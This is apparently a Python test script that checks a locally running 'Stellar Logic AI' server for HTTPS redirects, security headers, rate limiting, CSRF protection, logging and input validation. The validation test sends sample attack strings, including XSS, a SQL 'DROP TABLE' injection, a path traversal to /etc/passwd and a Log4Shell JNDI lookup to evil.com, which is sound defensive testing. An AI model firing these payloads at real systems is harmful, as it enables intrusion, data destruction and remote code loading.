#!/usr/bin/env python3
"""
Stellar Logic AI - Comprehensive Security Integration Tests
Test all security components working together in production environment
"""

import os
import sys
import json
import time
import requests
import threading
from datetime import datetime
from typing import Dict, List, Any, Tuple
import unittest
from concurrent.futures import ThreadPoolExecutor, as_completed

class StellarSecurityIntegrationTests:
    """Comprehensive security integration tests for Stellar Logic AI"""
    
    def __init__(self):
        self.base_url = "http://localhost"
        self.https_url = "https://localhost"
        self.test_results = []
        self.production_path = "c:/Users/merce/Documents/helm-ai/production"
        self.session = requests.Session()
        
        # Test configuration
        self.test_config = {
            "timeout": 10,
            "max_workers": 10,
            "rate_limit_test_requests": 70,
            "csrf_test_sessions": 5,
            "performance_test_duration": 30
        }
    
    def log_test_result(self, test_name: str, passed: bool, message: str, details: Dict[str, Any] = None):
        """Log test result"""
        result = {
            "test_name": test_name,
            "passed": passed,
            "message": message,
            "timestamp": datetime.now().isoformat(),
            "details": details or {}
        }
        self.test_results.append(result)
        
        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"{status} {test_name}: {message}")
        
        if details:
            for key, value in details.items():
                print(f"    {key}: {value}")
    
    def test_production_server_availability(self) -> bool:
        """Test if production server is running"""
        try:
            response = self.session.get(f"{self.base_url}/health", timeout=self.test_config["timeout"])
            passed = response.status_code == 200
            message = f"Server responded with status {response.status_code}"
            details = {
                "response_time": response.elapsed.total_seconds(),
                "server_headers": dict(response.headers)
            }
            self.log_test_result("Production Server Availability", passed, message, details)
            return passed
        except requests.exceptions.RequestException as e:
            self.log_test_result("Production Server Availability", False, f"Connection failed: {str(e)}")
            return False
    
    def test_security_status_endpoint(self) -> bool:
        """Test security status endpoint"""
        try:
            response = self.session.get(f"{self.base_url}/security-status", timeout=self.test_config["timeout"])
            passed = response.status_code == 200
            
            if passed:
                try:
                    security_data = response.json()
                    message = "Security status endpoint returned valid JSON"
                    details = {
                        "security_score": security_data.get("overall_security_score", "N/A"),
                        "components_implemented": len(security_data.get("components", [])),
                        "system": security_data.get("system", "Unknown")
                    }
                except:
                    message = "Security status endpoint returned invalid JSON"
                    details = {"response_text": response.text[:200]}
                    passed = False
            else:
                message = f"Security status endpoint returned status {response.status_code}"
                details = {"response_text": response.text[:200]}
            
            self.log_test_result("Security Status Endpoint", passed, message, details)
            return passed
        except requests.exceptions.RequestException as e:
            self.log_test_result("Security Status Endpoint", False, f"Request failed: {str(e)}")
            return False
    
    def test_https_enforcement(self) -> bool:
        """Test HTTPS enforcement"""
        try:
            # Try HTTP request (should redirect to HTTPS if enforced)
            response = self.session.get(f"{self.base_url}/", timeout=self.test_config["timeout"], allow_redirects=False)
            
            # Check for redirect to HTTPS
            if response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('Location', '')
                https_enforced = location.startswith('https://')
                message = f"HTTPS redirect: {'Enforced' if https_enforced else 'Not enforced'}"
                details = {
                    "status_code": response.status_code,
                    "location": location
                }
                self.log_test_result("HTTPS Enforcement", https_enforced, message, details)
                return https_enforced
            else:
                # Server might be running HTTP only
                message = f"HTTP request returned {response.status_code} (HTTPS not enforced)"
                details = {"status_code": response.status_code}
                self.log_test_result("HTTPS Enforcement", False, message, details)
                return False
        except requests.exceptions.RequestException as e:
            self.log_test_result("HTTPS Enforcement", False, f"Request failed: {str(e)}")
            return False
    
    def test_security_headers(self) -> bool:
        """Test security headers"""
        try:
            response = self.session.get(f"{self.base_url}/", timeout=self.test_config["timeout"])
            
            # Check for important security headers
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "DENY",
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": None,  # Value varies
                "Content-Security-Policy": None,  # Value varies
                "X-Stellar-Security": "Enterprise-Grade"
            }
            
            missing_headers = []
            present_headers = {}
            
            for header, expected_value in security_headers.items():
                actual_value = response.headers.get(header)
                if actual_value:
                    present_headers[header] = actual_value
                    if expected_value and actual_value != expected_value:
                        missing_headers.append(f"{header} (expected: {expected_value}, got: {actual_value})")
                else:
                    missing_headers.append(header)
            
            passed = len(missing_headers) == 0
            message = f"Security headers: {'All present' if passed else f'Missing: {missing_headers}'}"
            details = {
                "present_headers": present_headers,
                "missing_headers": missing_headers
            }
            
            self.log_test_result("Security Headers", passed, message, details)
            return passed
        except requests.exceptions.RequestException as e:
            self.log_test_result("Security Headers", False, f"Request failed: {str(e)}")
            return False
    
    def test_rate_limiting(self) -> bool:
        """Test rate limiting functionality"""
        print("\nTesting Rate Limiting (this may take a moment)...")
        
        try:
            # Make multiple requests to trigger rate limiting
            endpoint = "/api/test" if self.test_endpoint_exists("/api/test") else "/"
            
            responses = []
            start_time = time.time()
            
            for i in range(self.test_config["rate_limit_test_requests"]):
                try:
                    response = self.session.get(f"{self.base_url}{endpoint}", timeout=2)
                    responses.append({
                        "status_code": response.status_code,
                        "response_time": response.elapsed.total_seconds()
                    })
                    
                    # Check if we got rate limited
                    if response.status_code == 429:
                        break
                        
                except requests.exceptions.RequestException:
                    responses.append({"status_code": 0, "response_time": 0})
            
            end_time = time.time()
            total_time = end_time - start_time
            
            # Analyze responses
            rate_limited = any(r["status_code"] == 429 for r in responses)
            success_requests = len([r for r in responses if 200 <= r["status_code"] < 300])
            
            passed = rate_limited or success_requests >= 10  # Allow at least 10 requests
            
            message = f"Rate limiting: {'Active' if rate_limited else 'Not triggered'}, {success_requests} successful requests"
            details = {
                "total_requests": len(responses),
                "successful_requests": success_requests,
                "rate_limited": rate_limited,
                "total_time": total_time,
                "requests_per_second": len(responses) / total_time if total_time > 0 else 0
            }
            
            self.log_test_result("Rate Limiting", passed, message, details)
            return passed
        except Exception as e:
            self.log_test_result("Rate Limiting", False, f"Test failed: {str(e)}")
            return False
    
    def test_csrf_protection(self) -> bool:
        """Test CSRF protection"""
        print("\nTesting CSRF Protection...")
        
        try:
            # First, get a CSRF token
            token_response = self.session.get(f"{self.base_url}/api/csrf-token", timeout=self.test_config["timeout"])
            
            if token_response.status_code != 200:
                message = "CSRF token endpoint not available"
                self.log_test_result("CSRF Protection", False, message)
                return False
            
            token_data = token_response.json()
            csrf_token = token_data.get("csrf_token")
            
            if not csrf_token:
                message = "No CSRF token returned"
                self.log_test_result("CSRF Protection", False, message)
                return False
            
            # Test POST request with CSRF token
            headers = {"X-CSRF-Token": csrf_token}
            data = {"test_data": "csrf_test"}
            
            protected_response = self.session.post(
                f"{self.base_url}/api/protected", 
                headers=headers, 
                data=data,
                timeout=self.test_config["timeout"]
            )
            
            # Test POST request without CSRF token
            no_token_response = self.session.post(
                f"{self.base_url}/api/protected", 
                data=data,
                timeout=self.test_config["timeout"]
            )
            
            # CSRF protection is working if:
            # 1. Request with token succeeds (200) or fails gracefully (not 403 for CSRF)
            # 2. Request without token fails with 403 (CSRF violation)
            
            token_passed = protected_response.status_code != 403
            no_token_failed = no_token_response.status_code == 403
            
            passed = token_passed and no_token_failed
            
            message = f"CSRF protection: {'Active' if passed else 'Not working properly'}"
            details = {
                "with_token_status": protected_response.status_code,
                "without_token_status": no_token_response.status_code,
                "token_length": len(csrf_token)
            }
            
            self.log_test_result("CSRF Protection", passed, message, details)
            return passed
        except requests.exceptions.RequestException as e:
            self.log_test_result("CSRF Protection", False, f"Request failed: {str(e)}")
            return False
        except Exception as e:
            self.log_test_result("CSRF Protection", False, f"Test failed: {str(e)}")
            return False
    
    def test_endpoint_exists(self, endpoint: str) -> bool:
        """Check if endpoint exists"""
        try:
            response = self.session.get(f"{self.base_url}{endpoint}", timeout=2)
            return response.status_code != 404
        except:
            return False
    
    def test_concurrent_requests(self) -> bool:
        """Test system under concurrent load"""
        print("\nTesting Concurrent Requests...")
        
        try:
            def make_request(request_id):
                try:
                    start_time = time.time()
                    response = self.session.get(f"{self.base_url}/health", timeout=5)
                    end_time = time.time()
                    return {
                        "request_id": request_id,
                        "status_code": response.status_code,
                        "response_time": end_time - start_time,
                        "success": response.status_code == 200
                    }
                except Exception as e:
                    return {
                        "request_id": request_id,
                        "status_code": 0,
                        "response_time": 0,
                        "success": False,
                        "error": str(e)
                    }
            
            # Make concurrent requests
            with ThreadPoolExecutor(max_workers=self.test_config["max_workers"]) as executor:
                futures = [executor.submit(make_request, i) for i in range(20)]
                results = [future.result() for future in as_completed(futures)]
            
            # Analyze results
            successful_requests = len([r for r in results if r["success"]])
            avg_response_time = sum(r["response_time"] for r in results) / len(results)
            max_response_time = max(r["response_time"] for r in results)
            
            passed = successful_requests >= 15  # At least 75% success rate
            
            message = f"Concurrent requests: {successful_requests}/20 successful"
            details = {
                "successful_requests": successful_requests,
                "avg_response_time": avg_response_time,
                "max_response_time": max_response_time,
                "success_rate": successful_requests / 20
            }
            
            self.log_test_result("Concurrent Requests", passed, message, details)
            return passed
        except Exception as e:
            self.log_test_result("Concurrent Requests", False, f"Test failed: {str(e)}")
            return False
    
    def test_security_logging(self) -> bool:
        """Test security logging functionality"""
        try:
            # Check if security log file exists and has recent entries
            log_file = os.path.join(self.production_path, "logs/stellar_security.log")
            
            if not os.path.exists(log_file):
                message = "Security log file not found"
                self.log_test_result("Security Logging", False, message)
                return False
            
            # Check log file size and modification time
            file_size = os.path.getsize(log_file)
            mod_time = datetime.fromtimestamp(os.path.getmtime(log_file))
            time_diff = datetime.now() - mod_time
            
            # Read recent log entries
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()[-10:]  # Last 10 lines
                
                recent_entries = len([line for line in lines if "Stellar Logic AI" in line])
                passed = file_size > 0 and recent_entries > 0
                
                message = f"Security logging: {'Active' if passed else 'Not working'}"
                details = {
                    "file_size": file_size,
                    "last_modified": mod_time.isoformat(),
                    "recent_entries": recent_entries,
                    "time_diff_minutes": time_diff.total_seconds() / 60
                }
                
                self.log_test_result("Security Logging", passed, message, details)
                return passed
            except Exception as e:
                message = f"Could not read log file: {str(e)}"
                self.log_test_result("Security Logging", False, message)
                return False
        except Exception as e:
            self.log_test_result("Security Logging", False, f"Test failed: {str(e)}")
            return False
    
    def test_input_validation(self) -> bool:
        """Test input validation and sanitization"""
        try:
            # Test various injection attempts
            test_payloads = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}",
                "alert(1)",
                "SELECT * FROM users"
            ]
            
            endpoint = "/api/test" if self.test_endpoint_exists("/api/test") else "/"
            
            validation_results = []
            
            for payload in test_payloads:
                try:
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data={"input": payload},
                        timeout=5
                    )
                    
                    # Check if payload was rejected or sanitized
                    content = response.text.lower()
                    payload_in_response = payload.lower() in content
                    
                    validation_results.append({
                        "payload": payload[:20] + "...",
                        "status_code": response.status_code,
                        "payload_in_response": payload_in_response,
                        "validation_passed": not payload_in_response or response.status_code >= 400
                    })
                except Exception as e:
                    validation_results.append({
                        "payload": payload[:20] + "...",
                        "error": str(e),
                        "validation_passed": False
                    })
            
            # Analyze validation results
            passed_validations = len([r for r in validation_results if r.get("validation_passed", False)])
            total_tests = len(validation_results)
            
            passed = passed_validations >= total_tests * 0.8  # 80% pass rate
            
            message = f"Input validation: {passed_validations}/{total_tests} payloads properly handled"
            details = {
                "passed_validations": passed_validations,
                "total_tests": total_tests,
                "pass_rate": passed_validations / total_tests,
                "results": validation_results[:5]  # Show first 5 results
            }
            
            self.log_test_result("Input Validation", passed, message, details)
            return passed
        except Exception as e:
            self.log_test_result("Input Validation", False, f"Test failed: {str(e)}")
            return False
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all security integration tests"""
        print("STELLAR LOGIC AI - COMPREHENSIVE SECURITY INTEGRATION TESTS")
        print("=" * 70)
        
        # Test sequence
        tests = [
            ("Production Server Availability", self.test_production_server_availability),
            ("Security Status Endpoint", self.test_security_status_endpoint),
            ("HTTPS Enforcement", self.test_https_enforcement),
            ("Security Headers", self.test_security_headers),
            ("Rate Limiting", self.test_rate_limiting),
            ("CSRF Protection", self.test_csrf_protection),
            ("Concurrent Requests", self.test_concurrent_requests),
            ("Security Logging", self.test_security_logging),
            ("Input Validation", self.test_input_validation)
        ]
        
        # Run all tests
        for test_name, test_func in tests:
            try:
                test_func()
            except Exception as e:
                self.log_test_result(test_name, False, f"Test execution failed: {str(e)}")
        
        # Generate summary
        passed_tests = len([r for r in self.test_results if r["passed"]])
        total_tests = len(self.test_results)
        
        summary = {
            "timestamp": datetime.now().isoformat(),
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": total_tests - passed_tests,
            "success_rate": passed_tests / total_tests if total_tests > 0 else 0,
            "test_results": self.test_results,
            "overall_status": "PASS" if passed_tests == total_tests else "FAIL"
        }
        
        # Save test results
        results_file = os.path.join(self.production_path, "security_integration_test_results.json")
        with open(results_file, 'w') as f:
            json.dump(summary, f, indent=2)
        
        # Print summary
        print("\n" + "=" * 70)
        print("SECURITY INTEGRATION TEST SUMMARY")
        print("=" * 70)
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests}")
        print(f"Failed: {total_tests - passed_tests}")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        print(f"Overall Status: {summary['overall_status']}")
        
        if summary['overall_status'] == "FAIL":
            print("\nFailed Tests:")
            for result in self.test_results:
                if not result["passed"]:
                    print(f"  - {result['test_name']}: {result['message']}")
        
        print(f"\nTest results saved to: {results_file}")
        
        return summary

def main():
    """Main function"""
    tester = StellarSecurityIntegrationTests()
    results = tester.run_all_tests()
    
    return results['overall_status'] == "PASS"

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
